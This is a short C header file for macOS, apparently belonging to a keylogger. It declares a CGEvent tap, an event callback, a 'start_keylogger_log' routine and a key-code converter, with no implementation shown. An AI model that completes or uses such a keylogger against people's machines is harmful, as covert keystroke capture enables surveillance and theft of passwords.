#include <stdio.h>
#include <time.h>
#include <string.h>
#include <ApplicationServices/ApplicationServices.h>
#include <Carbon/Carbon.h>

extern volatile bool stop_keystrokes_stream;

CFMachPortRef eventTap;
void * start_keylogger_log();
CGEventRef CGEventCallback(CGEventTapProxy, CGEventType, CGEventRef, void*);
static const char * convert_key_code(int);
